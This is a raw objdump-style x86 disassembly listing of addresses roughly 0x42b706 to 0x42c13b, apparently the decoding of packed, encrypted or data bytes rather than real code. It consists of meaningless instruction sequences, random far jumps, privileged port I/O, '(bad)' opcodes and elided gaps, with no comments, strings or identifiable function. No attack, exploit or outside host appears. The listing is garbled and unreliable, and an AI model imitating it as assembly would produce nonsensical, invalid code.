  42b706:	mov    bl,BYTE PTR [ebx]
  42b708:	mov    ecx,0x17b61e55
  42b70d:	test   BYTE PTR ss:[esi+0x1c],dh
	...
  42b774:	dec    esi
  42b775:	inc    edx
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	imul   eax,DWORD PTR cs:[eax],0x1d1c34f
  42b787:	add    BYTE PTR ds:0x43000001,al
  42b78d:	xchg   esi,eax
  42b78e:	lods   al,BYTE PTR ds:[esi]
  42b78f:	inc    DWORD PTR [ebx-0x2570f77d]
  42b795:	mov    al,ss:0xe78ded99
  42b79b:	loopne 0x42b752
  42b79d:	int3   
  42b79e:	out    dx,eax
  42b79f:	mov    bl,0x27
  42b7a1:	shr    BYTE PTR [edx-0x3c28b07c],1
  42b7a7:	jmp    0xc1ef:0xd2adcc21
  42b7ae:	cmp    al,0x5a
  42b7b0:	addr16 dec ebx
  42b7b2:	jl     0x42b764
  42b7b4:	adc    dl,BYTE PTR [ebx]
  42b7b6:	mov    cl,0xd9
  42b7b8:	or     esp,DWORD PTR [ebp+0x57ce5a21]
  42b7be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b7bf:	mov    esp,0xb3769dfb
  42b7c4:	and    ebp,edx
  42b7c6:	pusha  
  42b7c7:	jmp    0xa1ed:0xca5eaf36
  42b7ce:	xor    al,0x59
  42b7d0:	xchg   ecx,eax
  42b7d1:	call   0xf7e6d7ac
  42b7d6:	add    BYTE PTR [eax+ebx*1-0x7721e62c],dl
  42b7dd:	shl    DWORD PTR [edx+0x77f822bd],1
  42b7e3:	sub    dh,cl
  42b7e5:	push   ebx
  42b7e6:	mov    dh,0x2a
  42b7e8:	xor    BYTE PTR [eax-0x38bcb93e],bh
  42b7ee:	adc    BYTE PTR [ecx+0x7c],0x13
  42b7f2:	out    0x15,eax
  42b7f4:	lea    edi,[ecx+0x1a87d521]
  42b7fa:	inc    ebp
  42b7fb:	fadd   st(3),st
  42b7fd:	cmc    
  42b7fe:	enter  0x7266,0x79
  42b802:	sbb    esi,esp
  42b804:	push   edx
  42b805:	in     eax,0xca
  42b807:	jl     0x42b86f
  42b809:	or     eax,0x2c19ce01
  42b80e:	sbb    bl,dh
  42b810:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b811:	xchg   edx,eax
  42b812:	push   ds
  42b813:	adc    esp,eax
  42b815:	adc    esp,DWORD PTR [eax]
  42b817:	xchg   ebp,eax
  42b818:	mov    esi,0x70938c74
  42b81d:	dec    edi
  42b81e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b81f:	sub    BYTE PTR [ebx+0x23],cl
  42b822:	or     eax,0xde30dc16
  42b827:	cwde   
  42b828:	inc    ebx
  42b829:	adc    eax,0x5fcc63ff
  42b82e:	rcl    BYTE PTR [esi+edi*1],0x2e
  42b832:	imul   edi,DWORD PTR [eax],0x57
  42b835:	outs   dx,BYTE PTR ds:[esi]
  42b836:	xor    eax,0xfc9af5f4
  42b83b:	sbb    al,0x33
  42b83d:	into   
  42b83e:	adc    bl,ch
  42b840:	les    esp,FWORD PTR [eax]
  42b842:	test   eax,0x9e99ca5
  42b847:	pop    ds
  42b848:	pop    ds
  42b849:	ret    
  42b84a:	clc    
  42b84b:	aas    
  42b84c:	sbb    al,BYTE PTR [eax+eiz*2]
  42b84f:	lahf   
  42b850:	pop    esp
  42b851:	bound  esp,QWORD PTR [edx+0xe6cfff1]
  42b857:	popa   
  42b858:	je     0x42b82f
  42b85a:	mov    ebx,ecx
  42b85c:	sub    ch,ah
  42b85e:	mov    dh,0x2
  42b860:	cmc    
  42b861:	inc    edi
  42b862:	push   eax
  42b863:	aad    0xb
  42b865:	int    0x54
  42b867:	clc    
  42b868:	sbb    bl,BYTE PTR [ebx]
  42b86a:	mov    dl,cl
  42b86c:	xor    bl,BYTE PTR [ecx+0x77]
  42b86f:	add    eax,0x89bcaec1
  42b874:	lock jmp 0x6f0b:0x4fb6eb70
  42b87c:	lahf   
  42b87d:	push   ds
  42b87e:	jecxz  0x42b877
  42b880:	cdq    
  42b881:	dec    ebx
  42b882:	xlat   BYTE PTR ds:[ebx]
  42b883:	fucomip st,st(4)
  42b885:	lods   al,BYTE PTR ds:[esi]
  42b886:	call   0x656e:0x79872de4
  42b88d:	cwde   
  42b88e:	outs   dx,BYTE PTR ss:[esi]
  42b890:	jo     0x42b892
	...
  42b8f2:	add    BYTE PTR [eax],al
  42b8f4:	call   0x2a7796
  42b8f9:	out    0xf9,eax
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     edi,DWORD PTR [ebp+0x26]
  42b902:	adc    eax,0x1d2c8e4
  42b907:	add    BYTE PTR ds:0x48000001,al
  42b90d:	jle    0x42b971
  42b90f:	adc    cl,BYTE PTR [edi]
  42b911:	inc    eax
  42b912:	dec    ecx
  42b913:	xor    DWORD PTR [ecx+0xf529eb6],0x7e
  42b91a:	xchg   esi,eax
  42b91b:	mov    BYTE PTR [edx-0x58c9151f],cl
  42b921:	icebp  
  42b922:	cli    
  42b923:	jmp    0xed5d:0x2c91f043
  42b92a:	scas   eax,DWORD PTR es:[edi]
  42b92b:	ins    DWORD PTR es:[edi],dx
  42b92c:	add    DWORD PTR [edx-0x42589eb0],edi
  42b932:	jl     0x42b97a
  42b934:	stos   BYTE PTR es:[edi],al
  42b935:	iret   
  42b936:	sub    ah,dh
  42b938:	lods   eax,DWORD PTR ds:[esi]
  42b939:	fadd   QWORD PTR [ecx+0x6b]
  42b93c:	cmp    ebx,DWORD PTR ds:0x5606be68
  42b942:	push   ds
  42b943:	xor    ah,bl
  42b945:	mov    bh,0x4c
  42b947:	jne    0x42b967
  42b949:	lds    ebp,FWORD PTR [edx-0x588cb552]
  42b94f:	int    0xea
  42b951:	xor    edx,0xcf865114
  42b957:	jmp    0x42b983
  42b959:	inc    ebx
  42b95a:	cwde   
  42b95b:	out    dx,al
  42b95c:	sbb    esp,esi
  42b95e:	out    dx,al
  42b95f:	or     al,0xce
  42b961:	data16 cli 
  42b963:	call   0x517fad99
  42b968:	jnp    0x42b979
  42b96a:	lds    esp,FWORD PTR [eax-0x5c]
  42b96d:	mov    cl,0xea
  42b96f:	dec    eax
  42b970:	sub    al,0xb2
  42b972:	mov    edx,0xc4a9173d
  42b977:	push   0x18
  42b979:	cld    
  42b97a:	enter  0xec7b,0x93
  42b97e:	add    DWORD PTR [edx+0x72459c38],edx
  42b984:	xchg   esi,eax
  42b985:	mov    cl,0xfa
  42b987:	sbb    esp,edx
  42b989:	sub    ebx,DWORD PTR [eax-0x40f39d06]
  42b98f:	ret    
  42b990:	add    BYTE PTR [edi-0x3],0x26
  42b994:	sbb    DWORD PTR [edi+0x4],ebp
  42b997:	push   es
  42b998:	xor    edx,DWORD PTR [eax-0x2abdf55e]
  42b99e:	jnp    0x42b9e8
  42b9a0:	retf   
  42b9a1:	inc    esp
  42b9a2:	sub    ebp,eax
  42b9a4:	inc    esp
  42b9a5:	push   ds
  42b9a6:	in     eax,0xab
  42b9a8:	inc    esi
  42b9a9:	xchg   edx,eax
  42b9aa:	mov    bh,0x74
  42b9ac:	retf   0x6b74
  42b9af:	repnz or eax,0xf3dbd4ed
  42b9b5:	or     bh,dl
  42b9b7:	cmp    ch,al
  42b9b9:	push   ebp
  42b9ba:	pop    ecx
  42b9bb:	invd   
  42b9bd:	mov    ds:0xda93b502,al
  42b9c2:	mov    ch,0x29
  42b9c4:	cli    
  42b9c5:	stc    
  42b9c6:	and    esp,DWORD PTR [ecx]
  42b9c8:	xchg   DWORD PTR [edx-0x6],ebx
  42b9cb:	gs popf 
  42b9cd:	rol    BYTE PTR [ebx],1
  42b9cf:	add    BYTE PTR [esp+esi*2+0x53bdb8df],al
  42b9d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b9d7:	and    DWORD PTR [esi+eax*8-0x3f9b2a12],ebp
  42b9de:	ja     0x42b9ca
  42b9e0:	jge    0x42b963
  42b9e2:	inc    ecx
  42b9e3:	jo     0x42ba0e
  42b9e5:	xor    al,0x9a
  42b9e7:	cdq    
  42b9e8:	lahf   
  42b9e9:	push   esp
  42b9ea:	mov    eax,ds:0x5c7983b4
  42b9ef:	jo     0x42b9a9
  42b9f1:	pop    ecx
  42b9f2:	sub    eax,0x1c7acdac
  42b9f7:	loope  0x42b995
  42b9f9:	pusha  
  42b9fa:	scas   eax,DWORD PTR es:[edi]
  42b9fb:	pop    esi
  42b9fc:	xor    WORD PTR [eax-0x3429f30],ax
  42ba03:	pop    edi
  42ba04:	and    ah,BYTE PTR [edx-0xd98db24]
  42ba0a:	or     al,0x2e
  42ba0c:	jg     0x42b9a4
  42ba0e:	out    0x30,eax
  42ba10:	sldt   WORD PTR [eax]
	...
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [esi-0x80],eax
  42ba82:	add    eax,0x1d3cd0f
  42ba87:	add    BYTE PTR ds:0x96000001,al
  42ba8d:	out    0xcc,eax
  42ba8f:	inc    edi
  42ba90:	fld    DWORD PTR [ecx]
  42ba92:	or     BYTE PTR [esi+0x5c],dh
  42ba95:	loopne 0x42ba8c
  42ba97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ba98:	dec    ebx
  42ba99:	cmp    al,ah
  42ba9b:	mov    ebp,0xe6526094
  42baa0:	mov    DWORD PTR [ebp-0x1ea77515],esi
  42baa6:	push   0xffffffb5
  42baa8:	jg     0x42bafa
  42baaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42baab:	jmp    0x1c24:0x2fff7f5b
  42bab2:	add    BYTE PTR [ebx-0x7],dh
  42bab5:	dec    ebp
  42bab6:	add    al,0x95
  42bab8:	inc    DWORD PTR [esi+0x25]
  42babb:	dec    esp
  42babc:	scas   eax,DWORD PTR es:[edi]
  42babd:	cmp    al,0x4
  42babf:	inc    ebx
  42bac0:	mov    es,WORD PTR [ebx+edx*2-0x43]
  42bac4:	push   ds
  42bac5:	aas    
  42bac6:	pop    esi
  42bac7:	rcl    DWORD PTR [eax],cl
  42bac9:	sub    eax,0xb79bc6ca
  42bace:	mul    ch
  42bad0:	es push 0xb5b1ee33
  42bad6:	icebp  
  42bad7:	jge    0x42baa2
  42bad9:	push   ebp
  42bada:	lahf   
  42badb:	or     DWORD PTR [ebx+eiz*1-0x3e89511f],eax
  42bae2:	fs and eax,0xbf63e630
  42bae8:	push   ds
  42bae9:	jmp    0x7909f5ed
  42baee:	xchg   ebx,eax
  42baef:	cmp    eax,0x9db2ee84
  42baf4:	ins    DWORD PTR es:[edi],dx
  42baf5:	mov    al,ds:0x111c264f
  42bafa:	fimul  DWORD PTR [ebx-0x4efead0f]
  42bb00:	add    esi,DWORD PTR [eax]
  42bb02:	ins    DWORD PTR es:[edi],dx
  42bb03:	scas   eax,DWORD PTR es:[edi]
  42bb04:	sbb    eax,0x2f77de08
  42bb09:	mov    DWORD PTR [eax-0x696bc2b],ebp
  42bb0f:	fadd   DWORD PTR [ebx+ebx*4]
  42bb12:	push   esp
  42bb13:	push   esi
  42bb14:	test   eax,0xc4b1ea75
  42bb19:	mov    al,ds:0x5461864c
  42bb1e:	bound  dx,DWORD PTR [ecx+0x63e905fe]
  42bb25:	inc    esi
  42bb26:	mov    DWORD PTR [edx],esp
  42bb28:	jge    0x42bb3f
  42bb2a:	xchg   esp,eax
  42bb2b:	out    0xec,eax
  42bb2d:	cmp    BYTE PTR [esi+0x2ed3601f],cl
  42bb33:	lahf   
  42bb34:	imul   ebx,DWORD PTR [ebp+ecx*8-0x1f],0x259c9f40
  42bb3c:	pop    edx
  42bb3d:	fs jp  0x42bb2f
  42bb40:	fwait
  42bb41:	cmp    ebx,DWORD PTR ds:0x48ea1cbc
  42bb47:	mov    bh,0x63
  42bb49:	and    eax,0x30de2278
  42bb4e:	push   es
  42bb4f:	je     0x42bb45
  42bb51:	popf   
  42bb52:	fisub  WORD PTR [edx-0x7264231b]
  42bb58:	inc    ebx
  42bb59:	in     eax,0xc7
  42bb5b:	imul   edi,DWORD PTR [eax-0x35],0x2f
  42bb5f:	out    dx,eax
  42bb60:	test   BYTE PTR [edi],0xc8
  42bb63:	jmp    0x9399822f
  42bb68:	adc    BYTE PTR [eax+0x48af6b89],dh
  42bb6e:	xor    DWORD PTR [ebx+0x3e],esp
  42bb71:	outs   dx,BYTE PTR ds:[esi]
  42bb72:	xlat   BYTE PTR ds:[ebx]
  42bb73:	add    bl,BYTE PTR [edi-0x79]
  42bb76:	out    dx,eax
  42bb77:	pop    esi
  42bb78:	gs inc ebp
  42bb7a:	or     eax,0xb1e70c11
  42bb7f:	and    al,0x55
  42bb81:	(bad)  
  42bb82:	int3   
  42bb83:	icebp  
  42bb84:	fdivr  DWORD PTR [ebx+0x3]
  42bb87:	and    eax,0x6f94a255
  42bb8c:	sub    dl,BYTE PTR [eax+0x9c7fb1]
	...
  42bbf2:	add    BYTE PTR [eax],al
  42bbf4:	xor    al,0x28
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	jb     0x42bbc5
  42bc02:	fstp   QWORD PTR [ecx-0x2e]
  42bc05:	aam    0x1
  42bc07:	add    BYTE PTR ds:0xce000001,al
  42bc0d:	jge    0x42bbc2
  42bc0f:	fstp   TBYTE PTR [esi-0xc]
  42bc12:	fld    QWORD PTR [eax+0x39]
  42bc15:	ja     0x42bc41
  42bc17:	lds    esp,FWORD PTR [ecx+0x63]
  42bc1a:	mov    esi,0xcb08abeb
  42bc1f:	out    0x49,eax
  42bc21:	mov    dh,0xaf
  42bc23:	rcr    DWORD PTR [eax+0x35],1
  42bc26:	and    eax,DWORD PTR [ebx-0x464bdfb6]
  42bc2c:	popf   
  42bc2d:	pop    esp
  42bc2e:	fwait
  42bc2f:	stos   BYTE PTR es:[edi],al
  42bc30:	mov    ds:0x167182ec,eax
  42bc35:	sahf   
  42bc36:	mov    eax,ds:0x2aaebfaf
  42bc3b:	sbb    DWORD PTR ss:[ebx],0xfffffff9
  42bc3f:	aad    0x6f
  42bc41:	inc    esp
  42bc42:	jecxz  0x42bc16
  42bc44:	pop    ds
  42bc45:	jmp    0x42bc8d
  42bc47:	loopne 0x42bbfd
  42bc49:	cmp    ah,BYTE PTR [esi+0x4e]
  42bc4c:	sub    BYTE PTR [ebx],0x62
  42bc4f:	mov    eax,0xe05a7910
  42bc54:	ins    BYTE PTR es:[edi],dx
  42bc55:	or     ch,al
  42bc57:	leave  
  42bc58:	mov    WORD PTR [ebp+ebx*8+0x726e8bfe],es
  42bc5f:	adc    ebp,DWORD PTR [ebp-0x60]
  42bc62:	shl    DWORD PTR [edx+ebp*8+0x1ddd1979],cl
  42bc69:	shl    BYTE PTR [ecx+0x68],0x41
  42bc6d:	sub    esi,edx
  42bc6f:	jl     0x42bc6f
  42bc71:	call   0xf4b:0x844cc838
  42bc78:	push   ds
  42bc79:	dec    ebp
  42bc7a:	add    edi,esi
  42bc7c:	mov    eax,0x3e518742
  42bc81:	sti    
  42bc82:	pop    ebp
  42bc83:	sub    DWORD PTR [ebp-0x7d],eax
  42bc86:	fimul  DWORD PTR [edx]
  42bc88:	call   0x51fc4de3
  42bc8d:	pop    esi
  42bc8e:	fmul   QWORD PTR ds:0x3fec6f2
  42bc94:	cmp    esp,DWORD PTR [edi]
  42bc96:	and    BYTE PTR [ebp+0x10],cl
  42bc99:	(bad)  
  42bc9a:	je     0x42bc5a
  42bc9c:	adc    dh,BYTE PTR [edx]
  42bc9e:	sbb    al,0x8
  42bca0:	iret   
  42bca1:	and    ebx,DWORD PTR [edi]
  42bca3:	jl     0x42bc93
  42bca5:	enter  0x2667,0xd6
  42bca9:	or     al,0xf6
  42bcab:	jmp    0x42bc9e
  42bcad:	pop    esp
  42bcae:	mov    ecx,0xca292ee4
  42bcb3:	int    0xe7
  42bcb5:	out    dx,eax
  42bcb6:	out    dx,eax
  42bcb7:	sbb    BYTE PTR [ecx+0x262dbb61],0xb5
  42bcbe:	ret    
  42bcbf:	imul   edi,esp,0xa122c86b
  42bcc5:	inc    edx
  42bcc6:	xchg   ebx,eax
  42bcc7:	jle    0x42bc86
  42bcc9:	jnp    0x42bd40
  42bccb:	pop    ebx
  42bccc:	fmulp  st(4),st
  42bcce:	ins    DWORD PTR es:[edi],dx
  42bccf:	(bad)  
  42bcd0:	sub    edi,DWORD PTR [esi-0x1ebc6ef8]
  42bcd6:	cwde   
  42bcd7:	sub    al,0xd0
  42bcd9:	outs   dx,DWORD PTR ds:[esi]
  42bcda:	xchg   edx,eax
  42bcdb:	jne    0x42bd1a
  42bcdd:	aaa    
  42bcde:	fwait
  42bcdf:	and    al,0xfc
  42bce1:	inc    edi
  42bce2:	push   0xffffffdc
  42bce4:	cmc    
  42bce5:	xchg   esp,eax
  42bce6:	mov    eax,ds:0xfa478c26
  42bceb:	aad    0x9e
  42bced:	call   0x65f5511
  42bcf2:	in     eax,dx
  42bcf3:	retf   
  42bcf4:	(bad)  
  42bcf5:	lods   al,BYTE PTR ds:[esi]
  42bcf6:	mul    DWORD PTR [ebx]
  42bcf8:	rcl    ecx,cl
  42bcfa:	pop    ss
  42bcfb:	pop    edx
  42bcfc:	sub    BYTE PTR [ebx+ebx*2+0x19],bl
  42bd00:	ins    BYTE PTR es:[edi],dx
  42bd01:	iret   
  42bd02:	cmp    BYTE PTR [edi-0x49ef4fbe],dl
  42bd08:	fsub   QWORD PTR [edi+0x2c]
  42bd0b:	je     0x42bd68
  42bd0d:	mov    edx,0x18fc8
	...
  42bd72:	add    BYTE PTR [eax],al
  42bd74:	mov    al,0xb6
  42bd76:	pushf  
  42bd77:	adc    al,0x9e
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bdda
  42bd81:	(bad)  
  42bd82:	xchg   edi,eax
  42bd83:	(bad)  
  42bd84:	xlat   BYTE PTR ds:[ebx]
  42bd85:	aad    0x1
  42bd87:	add    BYTE PTR ds:0xb8000001,al
  42bd8d:	mov    edi,DWORD PTR [ecx-0x796a83f0]
  42bd93:	inc    esi
  42bd94:	ret    0xd974
  42bd97:	jno    0x42bdcc
  42bd99:	xor    DWORD PTR [edx+ebp*2+0x53],ecx
  42bd9d:	icebp  
  42bd9e:	repnz cwde 
  42bda0:	xor    al,bh
  42bda2:	ins    DWORD PTR es:[edi],dx
  42bda3:	cmp    eax,0x8bd682d2
  42bda8:	aad    0x6
  42bdaa:	outs   dx,BYTE PTR ds:[esi]
  42bdab:	stos   DWORD PTR es:[edi],eax
  42bdac:	fisub  DWORD PTR ds:0xcab34fdf
  42bdb2:	scas   al,BYTE PTR es:[edi]
  42bdb3:	jle    0x42bdb4
  42bdb5:	push   esi
  42bdb6:	jp     0x42bd99
  42bdb8:	addr16 pop ss
  42bdba:	sub    DWORD PTR [esi+0x13],esp
  42bdbd:	dec    edi
  42bdbe:	arpl   dx,dx
  42bdc0:	es es repz sbb eax,0x710485eb
  42bdc8:	dec    edx
  42bdc9:	sahf   
  42bdca:	pop    eax
  42bdcb:	xor    eax,0xb71c5346
  42bdd0:	cwde   
  42bdd1:	push   esp
  42bdd2:	in     eax,0x8a
  42bdd4:	cmp    ch,BYTE PTR [ebx+0x36bb1cc6]
  42bdda:	sub    DWORD PTR [esi-0x6],esi
  42bddd:	aas    
  42bdde:	pop    edi
  42bddf:	test   BYTE PTR [edi+0x5ec1aa62],dh
  42bde5:	fnstcw WORD PTR [ecx-0x15]
  42bde8:	ret    
  42bde9:	mov    edi,0x5c78e552
  42bdee:	in     eax,dx
  42bdef:	adc    al,0x9e
  42bdf1:	icebp  
  42bdf2:	and    esi,ecx
  42bdf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bdf5:	mov    bh,0x1
  42bdf7:	mov    ds:0x10a99ff7,al
  42bdfc:	inc    esi
  42bdfd:	mov    edx,0x9163eb2
  42be02:	outs   dx,BYTE PTR ds:[esi]
  42be03:	lods   al,BYTE PTR ds:[esi]
  42be04:	dec    edx
  42be05:	pop    esp
  42be06:	das    
  42be07:	nop
  42be08:	dec    ebx
  42be09:	pop    esi
  42be0a:	sub    al,0x6f
  42be0c:	(bad)  
  42be0d:	mov    dl,0xda
  42be0f:	push   ecx
  42be10:	neg    DWORD PTR [edi]
  42be12:	and    esp,DWORD PTR [edx+eax*4+0x5]
  42be16:	xchg   ecx,eax
  42be17:	rcl    BYTE PTR [eax+0x7b],0x2b
  42be1b:	pop    es
  42be1c:	fist   DWORD PTR [eax]
  42be1e:	mov    esi,ss
  42be20:	hlt    
  42be21:	fsub   QWORD PTR [edi-0x32]
  42be24:	cmp    eax,DWORD PTR [eax+0x6343f6c3]
  42be2a:	xor    esi,DWORD PTR [ecx-0x46]
  42be2d:	enter  0x4e5c,0x7f
  42be31:	or     al,dh
  42be33:	jo     0x42be0c
  42be35:	ds mov ebp,0x56b88d13
  42be3b:	push   0x6b95fcde
  42be40:	jmp    0x6249:0x8f56386
  42be47:	es shl esp,0x4d
  42be4b:	mov    eax,0xb8b9e4a0
  42be50:	or     eax,0x18c60b1
  42be55:	sbb    dh,BYTE PTR [ebx+ebx*8+0x64c0162d]
  42be5c:	xchg   esi,eax
  42be5d:	(bad)  
  42be5e:	retf   0x175d
  42be61:	adc    eax,0x92862dc9
  42be66:	push   ebp
  42be67:	lock test eax,0x4352e9c9
  42be6d:	hlt    
  42be6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be6f:	mov    esi,0xd561e6cf
  42be74:	jl     0x42bea5
  42be76:	ins    BYTE PTR es:[edi],dx
  42be77:	hlt    
  42be78:	out    0x16,al
  42be7a:	mov    ch,0x36
  42be7c:	jnp    0x42bee3
  42be7e:	(bad)  
  42be7f:	repz dec edi
  42be81:	push   0xb4aba0f4
  42be86:	dec    eax
  42be87:	mov    dl,0xe2
  42be89:	xor    BYTE PTR [ebp-0x5b304bf6],al
  42be8f:	jne    0x42bf07
	...
  42bef1:	add    BYTE PTR [eax],al
  42bef3:	add    BYTE PTR [edi-0x825b8e0],dl
  42bef9:	call   FWORD PTR [edi-0x28375c93]
  42beff:	jnp    0x42befb
  42bf01:	(bad)  
  42bf02:	mov    eax,0x1d6dc1b
  42bf07:	add    BYTE PTR ds:0x64000001,al
  42bf0d:	lock jns 0x42be9c
  42bf10:	xchg   esp,eax
  42bf11:	out    dx,al
  42bf12:	inc    ebp
  42bf13:	and    BYTE PTR [edi-0x16],0xbc
  42bf17:	arpl   di,si
  42bf19:	and    dl,BYTE PTR [ebx]
  42bf1b:	xchg   edi,eax
  42bf1c:	in     al,0x9c
  42bf1e:	clc    
  42bf1f:	and    DWORD PTR [edx+edi*1],ecx
  42bf22:	and    esp,DWORD PTR [eax-0x30]
  42bf25:	xor    cl,BYTE PTR [edi+0x393d855d]
  42bf2b:	out    0x50,eax
  42bf2d:	ret    
  42bf2e:	lds    ebp,FWORD PTR [ebx-0x6a38c21c]
  42bf34:	fsubp  st(1),st
  42bf36:	test   BYTE PTR [edx+0xbdbeaa0],al
  42bf3c:	aam    0xe8
  42bf3e:	test   BYTE PTR [edx],ch
  42bf40:	ins    BYTE PTR es:[edi],dx
  42bf41:	and    eax,0x36fe3e23
  42bf46:	cmp    al,ch
  42bf48:	push   ebp
  42bf49:	jne    0x42bf40
  42bf4b:	xchg   ecx,eax
  42bf4c:	jp     0x42bfcc
  42bf4e:	test   al,0x48
  42bf50:	rcl    edi,cl
  42bf52:	dec    edi
  42bf53:	ss push ds
  42bf55:	cmp    WORD PTR ds:0x33e6617f,ax
  42bf5c:	js     0x42bf24
  42bf5e:	test   BYTE PTR [ecx],0x63
  42bf61:	add    al,0x3c
  42bf63:	stos   BYTE PTR es:[edi],al
  42bf64:	jmp    0x42beef
  42bf66:	sbb    cl,bh
  42bf68:	jne    0x42bf42
  42bf6a:	dec    edx
  42bf6b:	pop    ebx
  42bf6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf6d:	lds    edi,FWORD PTR [edx+ecx*1-0x628ec77c]
  42bf74:	into   
  42bf75:	mov    ds,WORD PTR [edi]
  42bf77:	popf   
  42bf78:	test   BYTE PTR [ecx-0x4eafd6e9],cl
  42bf7e:	jae    0x42bfa5
  42bf80:	test   al,0xb9
  42bf82:	sub    al,0x64
  42bf84:	je     0x42bf57
  42bf86:	pop    ebx
  42bf87:	mov    dh,0x53
  42bf89:	sar    DWORD PTR [esi],0x1d
  42bf8c:	scas   eax,DWORD PTR es:[edi]
  42bf8d:	jmp    0xe96e:0x10915ea3
  42bf94:	jmp    0x46a9:0x212adace
  42bf9b:	out    dx,al
  42bf9c:	js     0x42bf40
  42bf9e:	xchg   ebx,edx
  42bfa0:	ret    
  42bfa1:	mov    es,WORD PTR ds:0x4cf5a93
  42bfa7:	int    0xdd
  42bfa9:	xchg   edx,eax
  42bfaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bfab:	sub    eax,0x94c9e022
  42bfb0:	arpl   bx,cx
  42bfb2:	pop    ds
  42bfb3:	addr16 xchg bh,dh
  42bfb6:	out    dx,al
  42bfb7:	(bad)  
  42bfb8:	int3   
  42bfb9:	imul   DWORD PTR [bp+di]
  42bfbc:	xor    eax,0xf4467361
  42bfc1:	mov    ebx,0xfc10dbae
  42bfc6:	shr    DWORD PTR [esi-0x337cbf1b],cl
  42bfcc:	push   ds
  42bfcd:	mov    ecx,0x7961c5ff
  42bfd2:	aaa    
  42bfd3:	cwde   
  42bfd4:	and    eax,0xe0e3371
  42bfd9:	jmp    0x610d:0xd88d8518
  42bfe0:	inc    ebx
  42bfe1:	ss xchg ebp,eax
  42bfe3:	addr16 ds mov edi,0xfb7de111
  42bfea:	add    BYTE PTR [eax+0x5c],0x7
  42bfee:	sub    BYTE PTR ds:0x4de602a3,0xc8
  42bff5:	xchg   ebp,eax
  42bff6:	push   0xffffffce
  42bff8:	psubsb mm1,QWORD PTR [ecx]
  42bffb:	clc    
  42bffc:	push   ebx
  42bffd:	fwait
  42bffe:	sub    BYTE PTR ds:0xad23991d,cl
  42c004:	xchg   esi,eax
  42c005:	test   al,0x5d
  42c007:	push   eax
  42c008:	and    BYTE PTR [eax],cl
  42c00a:	sbb    eax,0x7ea602ae
  42c00f:	(bad)  [edi+0x0]
	...
  42c072:	add    BYTE PTR [eax],al
  42c074:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	sbb    DWORD PTR [edx+eiz*1+0x51],ebp
  42c084:	loope  0x42c05d
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    eax,0x65000001
  42c08d:	in     eax,0xe0
  42c08f:	fcmovne st,st(3)
  42c091:	jmp    0xb82a5c42
  42c096:	dec    edx
  42c097:	enter  0x48f,0x4f
  42c09b:	xor    eax,0x5ec67485
  42c0a0:	stos   BYTE PTR es:[edi],al
  42c0a1:	test   DWORD PTR [esi],esi
  42c0a3:	mov    dl,0x21
  42c0a5:	inc    ebx
  42c0a6:	push   ecx
  42c0a7:	dec    esi
  42c0a8:	or     BYTE PTR ds:0x394a131d,0xb3
  42c0af:	adc    al,0x7a
  42c0b1:	lds    edi,FWORD PTR [eax-0x6a]
  42c0b4:	mov    eax,ds:0x4fff8cff
  42c0b9:	ret    0xf7e4
  42c0bc:	push   ecx
  42c0bd:	mov    ebp,ds
  42c0bf:	add    eax,0xe6a1a953
  42c0c4:	dec    esp
  42c0c5:	inc    ebx
  42c0c6:	je     0x42c0c2
  42c0c8:	jmp    0xfa88a33b
  42c0cd:	mov    esi,DWORD PTR [eax]
  42c0cf:	mov    dh,BYTE PTR [edx+ebp*8+0x1b]
  42c0d3:	push   ds
  42c0d4:	pop    ecx
  42c0d6:	loope  0x42c0c9
  42c0d8:	fwait
  42c0d9:	sub    dh,BYTE PTR [ecx]
  42c0db:	les    edx,FWORD PTR [ebx-0x56267c74]
  42c0e1:	xchg   ebx,eax
  42c0e2:	cli    
  42c0e3:	sbb    DWORD PTR [esp+0x6bc70551],0x49
  42c0eb:	iret   
  42c0ec:	pop    esi
  42c0ed:	fistp  WORD PTR [ebx-0x16b29696]
  42c0f3:	inc    ecx
  42c0f4:	(bad)  
  42c0f5:	or     bh,BYTE PTR [edi+0x5e]
  42c0f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c0f9:	adc    eax,0x12fa943e
  42c0fe:	jge    0x42c0f2
  42c100:	int    0xc0
  42c102:	scas   al,BYTE PTR es:[edi]
  42c103:	push   edx
  42c104:	sahf   
  42c105:	mov    eax,ds:0x3373f248
  42c10a:	or     al,0xf5
  42c10c:	neg    BYTE PTR [edi+0x42]
  42c10f:	add    al,0xc4
  42c111:	dec    esp
  42c112:	sub    DWORD PTR [ecx+edx*8],0xee5e9323
  42c119:	daa    
  42c11a:	and    al,0x6b
  42c11c:	xadd   DWORD PTR [ecx-0x161fbc43],esp
  42c123:	mov    ?,ecx
  42c125:	lods   eax,DWORD PTR ds:[esi]
  42c126:	push   0xc4ed992d
  42c12b:	mov    al,0xb4
  42c12d:	mov    esi,DWORD PTR [ecx+0x45599b3d]
  42c133:	repz adc DWORD PTR [eax-0x6e],0x8c39b320
  42c13b:	je     0x42c160
